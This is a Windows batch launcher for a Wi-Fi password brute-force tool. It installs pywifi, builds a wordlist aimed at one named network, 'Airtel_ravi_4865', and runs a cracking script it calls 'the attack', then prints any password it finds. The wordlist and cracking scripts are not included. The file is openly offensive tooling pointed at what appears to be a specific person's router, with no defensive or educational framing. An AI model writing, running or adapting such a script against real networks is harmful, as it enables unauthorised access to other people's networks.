@echo off
TITLE Airtel Ravi Wi-Fi Cracker
color 0A

echo ======================================================
echo          AIRTEL RAVI WI-FI CRACKER AUTO-RUN
echo ======================================================
echo.

:: 1. Check for Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] ERROR: Python is not installed or not in PATH.
    pause
    exit /b
)

:: 2. Install Dependencies
echo [*] Verifying dependencies...
pip install pywifi comtypes --quiet
echo [+] Dependencies ready.
echo.

:: 3. Clean up previous false positives
if exist CRACKED.txt (
    echo [*] Found old CRACKED.txt. Renaming to CRACKED_OLD.txt...
    ren CRACKED.txt CRACKED_OLD_%random%.txt
)

:: 4. Ask to Resume or Start Fresh
if exist resume_state.txt (
    set /p choice="[*] Previous progress found. Resume? (Y/N): "
    if /I "%choice%"=="N" (
        echo [*] Deleting old progress...
        del resume_state.txt
    )
)

:: 5. Generate Wordlist
echo [*] Building targeted wordlist for Airtel_ravi_4865...
python wordlist_builder.py
echo.

:: 6. Start the Cracker
echo [*] Starting the attack...
echo [!] NOTE: This will disconnect your current Wi-Fi.
echo [!] Please stay close to the router.
echo.
python crack_wifi.py

echo.
echo ======================================================
echo                ATTACK PROCESS FINISHED
echo ======================================================
if exist CRACKED.txt (
    echo [+] SUCCESS! Check CRACKED.txt for the password.
    type CRACKED.txt
) else (
    echo [-] Attack finished without finding the password.
)
echo.
pause
